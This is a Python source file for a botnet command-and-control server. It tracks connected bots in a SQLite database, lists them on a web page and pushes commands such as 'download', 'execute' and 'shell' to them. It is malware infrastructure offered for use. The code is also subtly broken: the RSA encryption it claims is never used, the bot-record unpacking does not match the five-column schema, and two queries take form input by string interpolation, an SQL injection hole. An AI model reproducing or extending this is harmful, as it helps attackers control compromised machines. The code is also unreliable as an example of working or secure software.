#a botnet server where the botnet controller can send commands to the bots and receive their responses
# The server is multithreaded and can handle multiple bots at the same time
# The server is also encrypted using the RSA algorithm
# The server can see the bots' IP addresses and the commands they send on web interface

import socket
import threading
import os
import base64
import json
import time
import rsa
import hashlib
import sqlite3
import sys
import webbrowser
import http.server

# The server's IP address and port.
SERVER_IP = "172.22.9.105"
SERVER_PORT = 12345

# The server's public and private keys
server_public_key = None
server_private_key = None

# The botnet's database
DATABASE = "botnet.db"

# The botnet's table
TABLE = "bots"

# The botnet's columns
COLUMNS = ["id", "ip", "port", "public_key", "private_key"]

# The botnet's commands
COMMANDS = ["ping", "download", "upload", "execute", "shell", "exit"]

# The botnet's responses
RESPONSES = ["pong", "downloaded", "uploaded", "executed", "shelled", "exited"]

# The botnet's web interface

class BotnetServer(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(b"<html><head><title>Botnet Server</title></head><body>")
        self.wfile.write(b"<h1>Botnet Server</h1>")
        self.wfile.write(b"<h2>Bots</h2>")
        self.wfile.write(b"<table>")
        self.wfile.write(b"<tr><th>ID</th><th>IP</th><th>Port</th><th>Public Key</th><th>Private Key</th></tr>")
        for bot in get_bots():
            self.wfile.write(b"<tr>")
            for column in bot:
                self.wfile.write(b"<td>")
                self.wfile.write(str(column).encode())
                self.wfile.write(b"</td>")
            self.wfile.write(b"</tr>")
        self.wfile.write(b"</table>")
        self.wfile.write(b"<h2>Commands</h2>")
        self.wfile.write(b"<form method='POST'>")
        self.wfile.write(b"<select name='id'>")
        for bot in get_bots():
            self.wfile.write(b"<option value='")
            self.wfile.write(str(bot[0]).encode())
            self.wfile.write(b"'>")
            self.wfile.write(str(bot[0]).encode())
            self.wfile.write(b"</option>")
        self.wfile.write(b"</select>")
        self.wfile.write(b"<select name='command'>")
        for command in COMMANDS:
            self.wfile.write(b"<option value='")
            self.wfile.write(command.encode())
            self.wfile.write(b"'>")
            self.wfile.write(command.encode())
            self.wfile.write(b"</option>")
        self.wfile.write(b"</select>")
        self.wfile.write(b"<input type='submit' value='Send'>")
        self.wfile.write(b"</form>")
        self.wfile.write(b"</body></html>")

    def do_POST(self):
        content_length = int(self.headers["Content-Length"])
        post_data = self.rfile.read(content_length)
        post_data = post_data.decode()
        post_data = post_data.split("&")
        id = post_data[0].split("=")[1]
        command = post_data[1].split("=")[1]
        bot = get_bot(id)
        if bot:
            send_command(bot, command)
        self.send_response(301)
        self.send_header("Location", "/")
        self.end_headers()

def start_web_interface():
    web_interface = http.server.HTTPServer((SERVER_IP, 8080), BotnetServer)
    web_interface.serve_forever()

def start_server():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((SERVER_IP, SERVER_PORT))
    server_socket.listen(5)
    while True:
        bot_socket, bot_address = server_socket.accept()
        bot_ip, bot_port = bot_address
        bot_id = hashlib.md5(f"{bot_ip}:{bot_port}".encode()).hexdigest()
        bot = get_bot(bot_id)
        if bot:
            remove_bot(bot_id)
        add_bot(bot_ip, bot_port)
        bot_socket.close()
        print(f"Bot {bot_id} connected")

def create_database():
    connection = sqlite3.connect(DATABASE)
    cursor = connection.cursor()
    cursor.execute(f"CREATE TABLE IF NOT EXISTS {TABLE} ({', '.join([f'{column} TEXT' for column in COLUMNS])})")
    connection.commit()
    connection.close()

def get_bots():
    connection = sqlite3.connect(DATABASE)
    cursor = connection.cursor()
    cursor.execute(f"SELECT * FROM {TABLE}")
    bots = cursor.fetchall()
    connection.close()
    return bots

def get_bot(id):
    connection = sqlite3.connect(DATABASE)
    cursor = connection.cursor()
    cursor.execute(f"SELECT * FROM {TABLE} WHERE id = '{id}'")
    bot = cursor.fetchone()
    connection.close()
    return bot

def add_bot(ip, port):
    connection = sqlite3.connect(DATABASE)
    cursor = connection.cursor()
    bot_id = hashlib.md5(f'{ip}:{port}'.encode()).hexdigest()
    cursor.execute(f"INSERT INTO {TABLE} VALUES (?, ?, ?, NULL, NULL)", (bot_id, ip, port))
    connection.commit()
    connection.close()

def remove_bot(id):
    connection = sqlite3.connect(DATABASE)
    cursor = connection.cursor()
    cursor.execute(f"DELETE FROM {TABLE} WHERE id = '{id}'")
    connection.commit()
    connection.close()

def send_command(bot, command):
    bot_id, bot_ip, bot_port = bot
    bot_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    bot_socket.connect((bot_ip, int(bot_port)))
    bot_socket.send(command.encode())
    response = bot_socket.recv(4096).decode()
    bot_socket.close()
    print(f"Bot {bot_id} responded with {response}")

def main():
    if not os.path.exists(DATABASE):
        create_database()
    threading.Thread(target=start_web_interface).start()
    threading.Thread(target=start_server).start()
    webbrowser.open(f"http://{SERVER_IP}:{8080}")
    while True:
        time.sleep(1)

if __name__ == "__main__":
    main()
    # Path: botnet/botnet-bot.py